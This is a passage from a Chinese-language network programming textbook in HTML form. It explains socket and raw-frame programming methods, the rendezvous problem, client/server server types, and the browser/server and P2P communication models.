的网络程序设计将得到越来越广泛的应用。</p>\n<h3 id=\"基于tcpip协议栈的网络编程方法\"><a class=\"anchor\" href=\"#基于tcpip协议栈的网络编程方法\">#</a> 基于 TCP/IP 协议栈的网络编程方法</h3>\n<p>基于 TCP/IP 协议栈的网络编程是最基本的网络编程方式，主要是使用各种编程语言，利用操作系统提供的套接字网络编程接口，直接开发各种网络应用程序。在套接字通信中，常用套接字类型包括三类：流式套接字（用于在传输层提供面向连接、可靠的数据传输服务）、数据报套接字（用于在传输层提供无连接的数据传输服务）和原始套接字（用于网络层上的数据包访问）。</p>\n<p>这种编程方式由于直接利用网络协议栈提供的服务来实现网络应用，所以层次比较低，编程者有较大的自由度。这种编程要求程序设计者深入了解 TCP/IP 的相关知识，掌握套接字编程接口的主要功能和使用方法。</p>\n<h3 id=\"面向原始帧的网络编程方法\"><a class=\"anchor\" href=\"#面向原始帧的网络编程方法\">#</a> 面向原始帧的网络编程方法</h3>\n<p>在网络上直接发送和接收数据帧是最原始的数据访问方式。在这个层面上，程序员能够控制网卡的工作模式，灵活地访问帧中的各个字段。然而，这种灵活性也增加了程序设计的复杂性，要求程序员深入掌握操作系统底层的驱动原理，并具备较强的编程能力。面向原始帧的网络编程方法主要有以下几种。</p>\n<ol>\n<li>直接网卡编程技术</li>\n</ol>\n<p>在 OSI/RM 模型中，物理层和数据链路层的主要功能一般由硬件 —— 网络适配器（网络接口卡或网卡）来完成，每个工作站都安装有一个或多个网卡，每个网卡上都有自己的控制器，用以确定何时发送数据，何时从网络上接收数据，并负责执行网络协议所规定的规程，如构成帧、计算帧检验序列、执行编码译码转换等。</p>\n<p>对于不同的网络芯片，其编程方法略有区别，但原理相似，多使用汇编语言，通过操纵网卡寄存器实现对网卡微处理器的控制，完成数据帧的发送与接收。</p>\n<p>直接网卡编程为用户提供了直接控制网卡工作的能力，速度很快。但是这种编程方法比较抽象，要求编程人员具有一定的汇编语言基础，且由于不同厂商的网卡之间有很大的差异，程序的通用性较差。</p>\n<ol start=\"2\">\n<li>基于 Packet Driver 的网络编程方法</li>\n</ol>\n<p>为了屏蔽网络适配器的内部实现细节，使用户与网卡之间的通信更为方便，几乎所有的网卡生产厂家都提供相应的网卡驱动程序，其中包含了 Packet Driver 编程接口，由它来屏蔽网卡的具体工作细节，在上层应用软件和底层的网卡驱动程序之间提供一个接口。</p>\n<p>使用 Packet Driver 不用针对网卡硬件编程，使用较为方便，且 Packet Driver 作为一个网络编程标准，适用于所有网卡。</p>\n<ol start=\"3\">\n<li>基于 NDIS 的网络编程</li>\n</ol>\n<p>网络驱动程序接口规范（Network Driver Interface Specification，NDIS）是一个较为成熟的驱动接口标准，它包含局域网网卡驱动程序标准、广域网网卡驱动程序标准以及存在于协议和网络之间的中间驱动程序标准。它为网络驱动抽象了网络硬件，指定了分层网络驱动间的标准接口，因此，它为上层驱动（如网络传输）抽象了管理硬件的下层驱动。同时 NDIS 也维护了网络驱动的状态信息和参数，这包括到函数的指针、句柄等。</p>\n<p>NDIS 在网络编程中占据着重要的地位，许多编程方法都是基于 NDIS 实现的。</p>\n<ol start=\"4\">\n<li>WinPcap 编程</li>\n</ol>\n<p>WinPcap 是一个 Windows 平台下访问网络中数据链路层的开源库，能够用于捕获网络数据包并进行分析。</p>\n<p>WinPcap 为程序员提供了一套标准的网络数据包捕获接口，包括了一个内核级的数据包过滤器，一个低层的动态链接库（Packet.dll），一个高层的依赖于系统的库（wpcap.dll）。它可以独立于 TCP/IP 协议栈进行原始数据包的发送和接收，主要提供了直接在网卡上捕获原始数据包、核心层数据包过滤、通过网卡直接发送原始数据包和网络流量统计等功能。</p>\n<p>目前 WinPcap 已经达到了工业标准的应用要求，是非常成熟、实用的捕获与分析网络数据包的技术框架。</p>\n<h1 id=\"网络程序通信模型\"><a class=\"anchor\" href=\"#网络程序通信模型\">#</a> 网络程序通信模型</h1>\n<p>网络程序通信模型是网络应用程序设计的基础，决定了网络功能在每个通信节点的部署。本章首先探讨网络应用软件与网络通信之间的关系，从会聚点问题引出网络程序通信模型的重要性；重点介绍 <code>客户/服务器</code> 模型，从 <code>客户/服务器</code> 模型的基本概念入手，深入讨论客户端和服务器之间的数量、位置和角色关系，归纳服务器软件的特点，并从多个角度对服务器的类别进行分析；最后介绍了 <code>浏览器/服务器</code> 模型和 <code>P2P模型</code> 的基本概念和优缺点。</p>\n<p>透彻地理解网络程序通信模型的相关概念在网络程序设计过程中是十分重要的，能够使设计者从过去所学的网络构造原理转移到网络应用设计的层面上来，并在网络应用设计中有目的地选择适合的通信模型，搭建合理的程序架构。</p>\n<h2 id=\"网络应用软件与网络通信之间的关系\"><a class=\"anchor\" href=\"#网络应用软件与网络通信之间的关系\">#</a> 网络应用软件与网络通信之间的关系</h2>\n<p>网络通信是由底层物理网络和各层通信协议实现的，物理网络建立了相互连通的通信实体，通信协议在各个层次上以规范的消息格式和不同的服务能力保证了数据传输过程中的寻址、路由、转发、可靠性维护、流量控制、拥塞控制等一系列传输能力。网络硬件与协议实现相结合，形成了一个能使网络中任意一对计算机上的应用程序相互通信的基本通信结构。</p>\n<p>在计算机网络环境中，运行于协议栈之上并借助协议栈实现通信的网络应用程序，为用户提供了使用网络的简单界面，主要承担三个方面的功能：</p>\n<ol>\n<li>\n<p>实现通信能力。在协议簇的不同层次上选择特定通信服务，调用相应的接口函数实现数据传输功能。比如在文件传输应用中，使用客户 / 服务器模型，选择 TCP 协议完成数据传输。</p>\n</li>\n<li>\n<p>处理程序逻辑。根据程序功能，对网络交换的数据进行加工处理，从而满足用户的种种需求。以文件传输为例，网络应用程序应具备对文件的访问权限管理、断点续传等维护功能。</p>\n</li>\n<li>\n<p>提供用户交互界面。接受用户的操作指示，将操作指示转换为机器可识别的命令进行处理，并将处理结果显示于用户界面。在文件传输应用中，需提供文件下载选项、文件传输进度的实时显示等界面指示功能。</p>\n</li>\n</ol>\n<p>网络通信为网络应用软件提供了网络通信为网络应用软件提供了强大的通信功能，应用软件为网络通信提供了灵活方便的操作平台。实际上，在网络通信层面，仅仅提供了一个通用的通信架构，只负责传送信息；而在网络应用软件层面，仅仅考虑通信接口的调用。两者之间还需要有一些策略，这些策略能够对通信次序、通信过程、通信角色等问题进行协调和约束，从而合理组织分布在网络不同位置的应用程序，使其能够有序、正确地处理实际业务。</p>\n<p>以下从会聚点问题引出网络通信模型设计的必要性，重点介绍客户 / 服务器模型、浏览器 / 服务器模型和 P2P 模型。</p>\n<h2 id=\"会聚点问题\"><a class=\"anchor\" href=\"#会聚点问题\">#</a> 会聚点问题</h2>\n<p>尽管 TCP/IP 指明了数据如何在一对正在进行通信的应用程序间传递，但它并没有规定对等的应用程序在什么时间，以及为什么要进行交互，也没有规定程序员在一个分布式环境下应如何组织这样的应用程序。如果没有通信模型，会发生什么情况？我们来看一个典型的会聚点问题。</p>\n<p>设想操作员试图在分布于两个位置的机器上启动两个程序，并让它们通信，如图 2-1 所示。由于计算机的运行远比人的速度快得多，在某人启动第一个程序后，该程序开始执行并向其对等程序发送消息，在几个微妙内，它便发现对等程序不存在，于是就发出一条错误消息，然后退出。在这个过程中，某人启动了第二个程序，不幸的是，当第二个程序开始执行时，它发现对等程序已经终止，于是也退出了。这个过程可能会重复很多次，但由于每个程序的执行速度远快于用户的操作速度，因此它们在同一瞬间向对方发送消息并从此继续通信下去的概率是很低的。</p>\n<p><img data-src=\"image011.png\" alt=\"\" /></p>\n<p>由此看来，互联网仅仅提供了一个通用的通信架构，网络协议只是规定了应用程序在通信时所必须遵循的约定，并不解决用户的各种具体应用问题，而且它只负责传递数据，还有很多关于通信功能和通信实体的组织协调策略尚没有考虑，主要包括：</p>\n<ol>\n<li>\n<p>确定通信双方的角色，用以部署每个通信实体的具体功能。</p>\n</li>\n<li>\n<p>确定通信双方的通信次序，用以安排不同角色的通信实体的启动和停止时机以及交互顺序。</p>\n</li>\n<li>\n<p>确定通信的传送形式，用以指导应用程序对底层传输服务的选择。</p>\n</li>\n</ol>\n<p>为了保证网络中的分布式应用程序能够协同工作，不同网络模型对以上问题给出了不同的考虑。</p>\n<h2 id=\"客户服务器模型\"><a class=\"anchor\" href=\"#客户服务器模型\">#</a> 客户 / 服务器模型</h2>\n<p>在网络应用进程通信时，最主要的进程间交互的模型是客户 / 服务器（Client/Server，C/S）模型。客户 / 服务器模型的建立基于以下两点：</p>\n<p>首先，建立网络的起因是网络中软硬件资源、运算能力和信息不均等，需要共享，从而造就拥有众多资源的主机提供服务、资源较少的客户请求服务这一非对等关系。</p>\n<p>其次，网络间进程通信完全是异步的，相互通信的进程既不存在父子关系，也不共享内存缓冲区，因此需要一种机制为希望通信的进程建立联系，为二者的数据交换提供同步。</p>\n<p>客户 / 服务器模型开始流行于 20 世纪 90 年代，该模型将网络应用程序分为两部分，服务器负责数据管理，客户完成与用户的交互。该模型具有健壮的数据操纵和事务处理能力、数据安全性和完整性约束。</p>\n<h3 id=\"基本概念\"><a class=\"anchor\" href=\"#基本概念\">#</a> 基本概念</h3>\n<p>在客户 / 服务器模型中，客户和服务器分别是两个独立的应用程序，即计算机软件。</p>\n<p>客户（Client），请求的主动方，向服务器发出服务请求，接收服务器返回的应答。</p>\n<p>服务器（Server），请求的被动方，开放服务，等待请求，收到请求后，提供服务，做出响应。</p>\n<p>用户（User），使用计算机的人。</p>\n<p>客户 / 服务器模型最重要的特点是非对等相互作用，即客户与服务器处于不平等的地位，服务器拥有客户所不具备的硬件和软件资源以及运算能力，服务器提供服务，客户请求服务。</p>\n<p>客户 / 服务器模型相互作用的简单过程如图所示。</p>\n<p><img data-src=\"image012.png\" alt=\"\" /></p>\n<p>在这个过程中，服务器处于被动服务的地位。首先服务器要先启动，并根据客户请求提供相应的服务，服务器的工作过程如下：</p>\n<ol>\n<li>\n<p>打开一个通信通道，告知服务器进程所在主机将要在某一公认的端口（通常是 RFC 文档中分配的知名端口或双方协商的端口）上接收客户请求。</p>\n</li>\n<li>\n<p>等待客户的请求到达该端口。</p>\n</li>\n<li>\n<p>服务器接收到服务请求，处理该请求并发送应答。</p>\n</li>\n<li>\n<p>返回第 2 步，等待并处理另一个客户的请求。</p>\n</li>\n<li>\n<p>当特定条件满足时，关闭服务器。</p>\n</li>\n</ol>\n<p>注意，在步骤 3 服务器处理客户请求的过程中，服务器的设计可能会有很多策略。比如在处理简单客户请求时，服务器通常用单线程循环处理的方式工作；而在处理复杂不均等客户请求时，为了能够并发地接收多个客户的服务请求，服务器会创建一个新的进程或线程来处理每个客户的请求。另外，当使用不同的底层传输服务时，服务器在通信模块的调用上也会有所差别。</p>\n<p>客户采取的是主动请求方式，其工作过程如下：</p>\n<ol>\n<li>\n<p>打开一个通信通道，告知客户进程所在主机将要向某一公认的端口（通常是 RFC 文档中分配的知名端口或双方协商的端口）上请求服务。</p>\n</li>\n<li>\n<p>向服务器发送请求报文，等待并接收应答，然后继续提出请求。</p>\n</li>\n<li>\n<p>请求结束后，关闭通信通道并终止进程。</p>\n</li>\n</ol>\n<p>注意：在步骤 1，当使用不同的底层传输服务时，客户在通信模块的调用上会有所差别，比如使用 TCP 的客户需要首先连接到服务器所在主机的特定监听端口后再请求服务，而使用 UDP 的客户只需要在指定服务器地址后直接发送服务请求。</p>\n<h3 id=\"客户服务器关系\"><a class=\"anchor\" href=\"#客户服务器关系\">#</a> 客户 / 服务器关系</h3>\n<p>尽管我们经常说起客户和服务器，但在一般情况下，一个特定的程序到底是客户还是服务器并不总是很清晰，客户和服务器之间的交互是任意的。在实际的网络应用中，往往形成错综复杂的 C/S 交互局面。</p>\n<h4 id=\"客户与服务器的数量关系\"><a class=\"anchor\" href=\"#客户与服务器的数量关系\">#</a> 客户与服务器的数量关系</h4>\n<p>从客户和服务器的数量来看，存在两种关系：</p>\n<ol>\n<li>\n<p>多个客户进程同时访问一个服务器进程（n:1. 。在 Internet 上的各种服务器都能同时为多个客户提供服务。例如 Web 服务器在提供 Web 服务时，往往同时有上万个用户通过各类浏览器（作为客户）访问网页，服务器在设计和开发时应具备快速响应能力，能够区分不同客户的请求，能够公平地为多个客户提供服务。</p>\n</li>\n<li>\n<p>一个客户进程同时访问多个服务器提供的服务 1:n）。不同的服务器提供的服务各有不同，客户为了得到具体的服务器内容，需要向多个服务器提交请求。例如同时打开多个窗口的浏览器，每个窗口连接一个网站，当在一个窗口中浏览网页时，可能另一个窗口正在下载页面文件或图像。</p>\n</li>\n</ol>\n<h4 id=\"客户与服务器的位置关系\"><a class=\"anchor\" href=\"#客户与服务器的位置关系\">#</a> 客户与服务器的位置关系</h4>\n<p>从客户和服务器所处的网络环境来看，存在三种情况，如图所示。</p>\n<p><img data-src=\"image013.png\" alt=\"\" /></p>\n<ol>\n<li>\n<p>客户和服务器运行在同一台机器上。因为没有涉及物理网络，这是最简单的一种部署，数据从客户或服务器发出，沿着 TCP/IP 协议栈下行，然后在内部返回，沿着 TCP/IP 协议栈上行作为输入。在网络应用程序开发时，这种设置有很多优点。首先这种方法提供了一种理想的实验环境，包不会丢失、延迟或不按顺序递交；其次由于没有网络延迟，所以可以很容易粗略地判断客户和服务器应用程序的性能；最后作为一种进程间通信的方法，可以方便地把两个本来独立的功能通过网络交互的形式组合起来。</p>\n</li>\n<li>\n<p>客户和服务器运行在同一个局域网内的不同机器上。这个环境涉及真正的网络，但是这个环境仍然还是近乎理想化的，数据包几乎不会丢失、乱序。网络打印机是一个常见的例子，一个局域网可能为几台主机只配置一个打印机，其中一个主机充当服务器，接收来自其他主机（客户）的打印请求，并把这些数据放到缓冲区中等候打印机打印。</p>\n</li>\n<li>\n<p>客户和服务器运行于广域网不同网络内的机器上。广域网可以是 Internet 或是公司的内部网，两个应用程序不在同一个局域网内，从一个应用程序发出到另一个应用程序的 IP 数据包必须经过一个或若干个路由器转发。这种环境比前两种复杂得多，常常会由于网络拥塞、震荡等问题导致数据丢失、乱序。在网络应用程序开发时，这种情形要求程序设计者考虑很多因素，比如要考虑可靠性的问题，选择可靠的传输服务，或在应用程序设计中增加可靠性的维护功能。另外，经过网络地址转换后的内网地址是无法通过广域网直接访问的，在程序部署时也需要考虑这一机制带来的影响。</p>\n</li>\n</ol>\n<h4 id=\"客户与服务器的角色关系\"><a class=\"anchor\" href=\"#客户与服务器的角色关系\">#</a> 客户与服务器的角色关系</h4>\n<p>从应用程序的角色来看，存在三种情况：</p>\n<ol>\n<li>\n<p>应用程序作为纯粹的客户运行。在这种情况下，客户软件只有主动发出请求和接收响应的能力，例如浏览器作为 Web 服务器的客户运行就是单纯的客户角色。</p>\n</li>\n<li>\n<p>应用程序作为纯粹的服务器运行。在这种情况下，服务器软件单纯提供自身资源具备的服务，例如文件服务器提供文件的上传与下载。</p>\n</li>\n<li>\n<p>应用程序同时具有客户和服务器两种角色。一个服务器在提供服务的过程中可能并不具备该服务所需的所有资源，例如文件服务器为了给文件标注准确的访问时间，需要获得当时的标准时间，但是该服务器没有日期时钟，那么为了获得这个时间，该服务器会作为客户向时间服务器发出请求，在这种情况下，文件服务器同时担当了客户和服务器两种角色。</p>\n</li>\n</ol>\n<p>以上从数量、位置和角色三个方面，分析了在真实的网络应用中客户和服务器的关系，我们观察到客户与服务器的关系并不是简单的 1 对 1，其传输路径可能跨越若干网络，其角色复杂多样，这要求我们在应用程序设计过程中，需要结合实际情况注意以下两点：</p>\n<p>第一，不同形式的客户 / 服务器角色，其程序的设计方法各有不同，应在实际操作过程中考虑到这种差别。</p>\n<p>第二，应用场景不同，客户和服务器关系也不同，应结合应用程序对服务的效率与公平性需求、对网络传输可靠性的需求、对资源的访问需求等综合决策，给出合理的网络程序设计方案。</p>\n<h3 id=\"服务器软件的特点与分类\"><a class=\"anchor\" href=\"#服务器软件的特点与分类\">#</a> 服务器软件的特点与分类</h3>\n<h4 id=\"服务器的特权和复杂性\"><a class=\"anchor\" href=\"#服务器的特权和复杂性\">#</a> 服务器的特权和复杂性</h4>\n<p>由于服务器软件往往需要访问操作系统保护的数据资源、计算资源以及协议端口，所以服务器软件常常具有一些特定的系统权限。服务器软件在提供服务的过程中，为了保证其服务功能不会粗心地将特权传递给访问它的客户，服务器的设计和开发要非常小心。除了基本的网络通信和服务功能，服务器还应具备处理以下问题的能力：</p>\n<ul>\n<li>\n<p>鉴别 —— 验证客户的身份；</p>\n</li>\n<li>\n<p>授权 —— 确定某个给定的客户是否被允许访问服务器所提供的服务；</p>\n</li>\n<li>\n<p>数据安全 —— 确保数据不被无意泄露或损坏；</p>\n</li>\n<li>\n<p>保密 —— 防止对有关个人的信息进行未授权的访问；</p>\n</li>\n<li>\n<p>保护 —— 确保网络应用程序不能滥用系统资源。</p>\n</li>\n</ul>\n<p>另外，对于那些执行高强度计算或处理大量数据的服务器，还要考虑增加并发处理请求的能力，使其运行更加高效。</p>\n<p>综合来看，相比客户，特权的保护和并发操作等使服务器的设计与实现更加复杂。</p>\n<h4 id=\"无连接和面向连接的服务器\"><a class=\"anchor\" href=\"#无连接和面向连接的服务器\">#</a> 无连接和面向连接的服务器</h4>\n<p>对于网络应用程序的设计，首要的决定是在传输层选择一种传输服务：无连接服务或面向连接服务。这两种服务直接对应于 TCP/IP 协议簇的两个主要的传输层协议：UDP 协议和 TCP 协议。如果客户和服务器使用 UDP 进行通信，那么交互就是无连接的；如果使用 TCP，那么交互就是面向连接的。</p>\n<p>从应用程序设计者的角度看，无连接的交互和面向连接的交互之间有很大的区别，其服务能力决定了下层系统所提供的可靠性等级。TCP 提供了通过互联网络进行通信所需的可靠性维护能力：它验证数据的到达；对未到达的报文段自动重传；计算数据上的校验和以保证数据在传输过程中没有损坏；使用序号以确保数据按序到达并自动忽略重复的分组；提供了流量控制功能以确保发送方发送数据的速度不要超过接收方的承受能力；如果下层网络因任何原因变得无法运行，TCP 将通知客户和服务器。与 TCP 相比，UDP 并没有在可靠传输上做出任何保证，数据可能会丢失、重复、延迟或者传递失序。客户和服务器必须采取合适的措施检查并更正这样的差错。</p>\n<p>使用 TCP 的服务器是面向连接的服务器。面向连接的服务器的主要优势是易于编程。这是由于传输层 TCP 协议已经自动处理了分组的丢失、交付失序等不可靠问题，面向连接的服务器只要管理和使用这些连接就可以保证数据传送功能的可靠运行。</p>\n<p>面向连接的服务器也存在缺点。由于每个连接需要操作系统额外为其分配资源，而且 TCP 在一个空闲的连接上几乎不发送分组，假如一个服务器之前已经与很多个客户建立了连接，那么在某种极端的情况下，当这些客户所在的系统都同时崩溃或网络连接中断时，TCP 并不会发送任何通知报文，面向连接的服务器之前已经分配给这些连接的数据结构（包括缓冲区空间）等在一段较长的时间内会一直被占用，如果不断有客户崩溃，服务器可能会耗尽资源，进而终止运行。</p>\n<p>使用 UDP 的服务器是无连接的服务器。无连接的服务器不需要在传输数据过程中维护连接，因此数据投递非常灵活高效。尽管无连接的服务器没有资源耗尽问题的困扰，但它们不能依赖下层传输协议提供可靠的投递，通信的一方或双方必须担当起可靠交付的责任。比如：如果没有响应到达，客户要承担超时重传请求的责任；如果服务器需要将其响应分为若干个分组，还需实现数据缓存和重组机制。对于网络应用程序的设计者来说，这些可靠性维护的工作可能十分困难，需要对协议设计具备相当的专业知识。</p>\n<p>在选择无连接的服务器时的另一个考虑是该服务器是否需要广播或组播通信，由于 TCP 只能提供点到点通信，它不能提供广播或组播通信，这些服务需要使用 UDP。</p>\n<p>总之，面向连接的服务器和无连接的服务器使用了不同的传输服务，在编程复杂性、数据传输代价等方面各有优缺点，两类服务器的选择，关键在于结合网络运行环境和应用程序的实际需求确定一种最适合的传输层协议。</p>\n<h4 id=\"无状态和有状态的服务器\"><a class=\"anchor\" href=\"#无状态和有状态的服务器\">#</a> 无状态和有状态的服务器</h4>\n<p>我们把状态信息理解为服务器所维护的、关于它与客户交互的信息。</p>\n<p>无状态的服务器不保存任何状态信息，要求每次客户的请求是无二义性的，也就是说无论一个请求何时到达或重复到达，服务器都应给出相同的响应。在对可靠性要求较高的情况，尤其是使用无连接传输时，这类服务器设计会比较常见。数据在网络中传输很有可能出现重复、延迟、丢失或失序交付，如果传输协议不能保证可靠交付，那么可以通过设计可靠交付的应用协议来弥补这一缺陷。</p>\n<p>有状态的服务器维护了与其存在交互历史的客户的状态信息，这些状态信息减少了客户和服务器间交换的报文内容，帮助服务器在接收到客户发来的请求时能够快速做出响应。尽管状态信息可以提高效率，但是状态的维护是一个复杂的问题。如果报文丢失、重复或交付失序，或者如果客户计算机崩溃或重启动，则一个服务器中的状态信息就会变得不正确，此后，在服务器计算响应时，如果使用了不正确的状态信息，就可能产生不正确的响应（错误的文件读取结果、混乱的用户标识、重复写文件等）。</p>\n<p>一个服务器到底是无状态还是有状态，更多取决于应用协议而不是实现，如果应用协议规定了某个报文的含义在某种方式上依赖于先前的一些报文，那么它就不可能提供无状态的交互。</p>\n<h4 id=\"循环服务器和并发服务器\"><a class=\"anchor\" href=\"#循环服务器和并发服务器\">#</a> 循环服务器和并发服务器</h4>\n<p>一个服务器通常被设计为面向多个客户提供服务，那么服务器在一个时刻能够处理多少客户的请求呢？循环服务器描述了在一个时刻只处理一个请求的服务器实现方式，并发服务器描述了在一个时刻可以处理多个请求的服务器实现方式。</p>\n<p>循环服务器通过在单线程内设置循环控制实现对多个客户请求的逐一响应。这种服务器的设计、编程、调试和修改是最容易的，因此，只要循环执行的服务器对预期的负载能提供足够快的响应速度，多数程序员会选择这种循环的设计。循环服务器往往在由无连接协议承载的简单服务中工作得很好。</p>\n<p>将并发引入服务器中的主要原因是需要给多个客户提供快速响应时间。并发性可以在以下几种情况下缩短响应时间：</p>\n<ul>\n<li>\n<p>构造响应要求有相当的 I/O 时间。允许服务器并发地计算响应，意味着即使机器只有一个 CPU，它也可以部分重叠地使用处理器和外设，这样当处理器忙于计算一个响应时，I/O 设备可以将数据传送到存储器中，而这可能是其他响应所需要的，这使得服务器避免了无谓的 I/O 等待。</p>\n</li>\n<li>\n<p>每个请求需要的响应处理时间变化很大。时间分片允许单个处理器处理那些只要求少量处理的请求，而不必等待处理完那些需要长处理时间的请求，这保证了服务器提供服务的公平性。</p>\n</li>\n<li>\n<p>服务器运行在一个拥有多处理器的计算机上。可以允许不同处理器为不同的请求做出响应。</p>\n</li>\n</ul>\n<p>并发服务器通过使请求处理和 I/O 部分重叠而达到高性能。这种服务器的开发和调试代价较高，在面向连接的服务器设计中，用并发方式处理多个客户的请求是目前最广泛使用的服务器类型。常见的并发服务器的实现方法是多线程或单线程异步 I/O 机制。在多线程实现方法中，服务器主线程为每个到来的客户请求创建一个新的子服务线程。一般这类服务器的代码由两部分组成：第一部分代码负责监听并接收客户请求，为客户请求创建一个新的服务线程；另一部分代码负责处理单个客户的请求。在单线程异步 I/O 实现方法中，服务器主线程管理多个连接，通过使用异步 I/O 捕获最先满足 I/O 条件的连接并进行处理，以此在单个线程中及时处理 I/O 事件，达到表面上的并发性。</p>\n<p>循环服务器和并发服务器的选择取决于对单个客户请求的处理时延。我们定义 “服务器的请求处理时间” 为服务器处理单个孤立的请求所花费的时间，定义 “客户的观测响应时间” 为客户发送一个请求至服务器响应之间的全部时延。</p>\n<p>循环服务器在以下两种情况下是不能满足应用需求的：</p>\n<ol>\n<li>\n<p>客户的观测响应时间远大于服务器的请求处理时间。如果服务器正在处理一个已经存在的客户请求时另一个请求到达了，系统便将这个新的请求排队，那么第二个客户要等待服务器处理完之前的请求和当前客户的请求后才能收到响应。假如客户请求到达过于频繁，服务器来不及处理，会使得队列越来越长，对客户的响应时间也越来越长，此时循环服务器已不能满足需求。</p>\n</li>\n<li>\n<p>服务器的请求处理时间大于单个请求要求的时间范围。如果一个服务器的设计能力为可处理 K 个客户，而每个客户每秒发送 N 个请求，则此服务器的请求处理时间必须小于每个请求 1/（KN）秒。如果服务器不能以所要求的速率处理完一个请求，那么等待其服务的客户请求队列最终将溢出。为了避免可能具有很长请求处理时间的客户请求队列溢出，设计者必须考虑服务器的并发实现。</p>\n</li>\n</ol>\n<h3 id=\"客户服务器模型的优缺点\"><a class=\"anchor\" href=\"#客户服务器模型的优缺点\">#</a> 客户 / 服务器模型的优缺点</h3>\n<p>客户 / 服务器模型的优点如下：</p>\n<ol>\n<li>\n<p>结构简单。系统中不同类型的任务分别由客户和服务器承担，有利于发挥不同机器平台的优势。</p>\n</li>\n<li>\n<p>支持分布式、并发环境。特别是当客户和服务器之间的关系是多对多时，可以有效地提高资源的利用率和共享程度。</p>\n</li>\n<li>\n<p>服务器集中管理资源，有利于权限控制和系统安全。</p>\n</li>\n<li>\n<p>可扩展性较好。可有效地集成和扩展原有的软、硬件资源。以前在其他环境下积累的数据和软件均可在 C/S 中通过集成而继续使用，并且可以透明地访问多个异构的数据源，自由地选用不同厂家的数据应用开发工具，具有高度的灵活性，客户和服务器均可单独地升级。</p>\n</li>\n</ol>\n<p>客户 / 服务器模型存在以下局限：</p>\n<ol>\n<li>\n<p>缺乏有效的安全性。由于客户与服务器直接相连，当在客户上存取一些敏感数据时，由于用户能够直接访问中心数据库，就可能造成敏感数据的修改或丢失。</p>\n</li>\n<li>\n<p>客户负荷过重。随着计算机处理的事务越来越复杂，客户程序也日渐冗长。同时由于事务处理规则的变化，也需要随时更新客户程序，这就相应地增加了维护困难和工作量。</p>\n</li>\n<li>\n<p>服务器工作效率低。由于每个客户都要直接连接到服务器以访问数据资源，这就使得服务器不得不因为客户的访问而消耗大量原本就十分紧张的服务器资源，从而造成服务器工作效率不高。</p>\n</li>\n<li>\n<p>容易造成网络阻塞。多个客户对服务器的同时访问可能会使得服务器所处的网络流量剧增，进而形成网络阻塞。</p>\n</li>\n</ol>\n<h2 id=\"浏览器服务器模型\"><a class=\"anchor\" href=\"#浏览器服务器模型\">#</a> 浏览器 / 服务器模型</h2>\n<h3 id=\"基本概念-2\"><a class=\"anchor\" href=\"#基本概念-2\">#</a> 基本概念</h3>\n<p>浏览器 / 服务器（Browser/Server，B/S）模型是随着 Internet 技术的兴起，对 C/S 模型的一种变化或者改进，它在 20 世纪 90 年代中期逐渐形成和发展。在这种 B/S 模型中，用户界面完全通过 WWW 浏览器实现，一部分事务逻辑在前端（浏览器）实现，但是主要事务逻辑在服务器端实现，通常以三层架构部署实施。主要包括以下三层：</p>\n<ul>\n<li>\n<p>客户端表示层。由 Web 浏览器组成，它不存放任何应用程序。</p>\n</li>\n<li>\n<p>应用服务器层。由一台或多台服务器（Web 服务器也位于这一层）组成，处理应用中的所有业务逻辑、对数据库的访问等工作。该层具有良好的可扩展性，可以随着应用的需要任意增加服务器的数目。</p>\n</li>\n<li>\n<p>数据中心层。由数据库系统组成，用于存放业务数据。</p>\n</li>\n</ul>\n<p>浏览器 / 服务器模型是一种特殊的客户 / 服务器模型，特殊之处在于这种模型的客户一般是某种流行的浏览器，使用 HTTP 协议通信。其实现机制是利用了不断成熟的 WWW 浏览器技术，结合浏览器的多种脚本语言 (VBScript、JavaScript 等) 和 ActiveX 技术，用通用浏览器实现原来需要复杂专用软件才能实现的客户功能，节约了开发成本。</p>\n<h3 id=\"浏览器服务器工作的一般过程\"><a class=\"anchor\" href=\"#浏览器服务器工作的一般过程\">#</a> 浏览器 / 服务器工作的一般过程</h3>\n<p>浏览器 / 服务器工作的一般过程如图所示。</p>\n<p><img data-src=\"image014.png\" alt=\"\" /></p>\n<p>首先，用户通过浏览器向 Web 服务器提出 HTTP 请求。</p>\n<p>然后，Web 服务器根据请求调出相应的 HTML、XML 文档或 ASP、JSP 文件。如果是 HTML 或 XML 文档，则直接返回给浏览器；如果是 ASP、JSP 等动态脚本文档，Web 服务器首先执行文档中的服务器脚本程序，然后把执行结果返回给浏览器。</p>\n<p>最后，浏览器接收到 Web 服务器发回的页面内容，显示给用户。</p>\n<h3 id=\"览器服务器模型的优缺点\"><a class=\"anchor\" href=\"#览器服务器模型的优缺点\">#</a> 览器 / 服务器模型的优缺点</h3>\n<p>浏览器 / 服务器模型的优点是：</p>\n<ol>\n<li>\n<p>具有分布性特点，可以随时随地进行查询、浏览等业务处理；</p>\n</li>\n<li>\n<p>业务扩展简单方便，通过增加网页即可增加服务器功能；</p>\n</li>\n<li>\n<p>维护简单方便，只需要改变网页，即可实现所有用户的同步更新；</p>\n</li>\n<li>\n<p>开发简单，共享性强。</p>\n</li>\n</ol>\n<p>浏览器 / 服务器模型的缺点是：</p>\n<ol>\n<li>\n<p>操作是以鼠标为最基本的操作方式，无法满足快速操作的要求；</p>\n</li>\n<li>\n<p>页面动态刷新，响应速度明显降低；</p>\n</li>\n<li>\n<p>功能弱化，难以实现传统模式下的特殊功能要求。</p>\n</li>\n</ol>\n<h2 id=\"p2p模型\"><a class=\"anchor\" href=\"#p2p模型\">#</a> P2P 模型</h2>\n<h3 id=\"p2p的基本概念\"><a class=\"anchor\" href=\"#p2p的基本概念\">#</a> P2P 的基本概念</h3>\n<p>随着应用规模的不断扩大，软件复杂度不断提高，面对巨大的用户群，单服务器成为性能的瓶颈。尤其是出现了拒绝服务（Denial of Service，DoS）攻击后，更凸显了客户 / 服务器模型的问题，服务器是网络中最容易受到攻击的节点，只要海量地向服务器发出服务请求，就能导致服务器瘫痪，以致所有的客户都不能得到服务响应。</p>\n<p>此外，客户的硬件性能不断提高，但在客户 / 服务器模型中，客户只做一些简单的工作，造成资源的巨大浪费。</p>\n<p>由此看来，客户 / 服务器模型已不能满足有效利用客户系统资源的需求。为了解决这些问题，出现了 P2P 技术。</p>\n<p>P2P 是 Peer-to-Peer 的简写，Peer 在英语里有 “对等者” 和 “伙伴” 的意义。因此，从字面上看，P2P 可以理解为对等互联网。国内的媒体一般将 P2P 翻译成 “点对点” 或者 “端对端”，学术界则统一称为对等计算。P2P 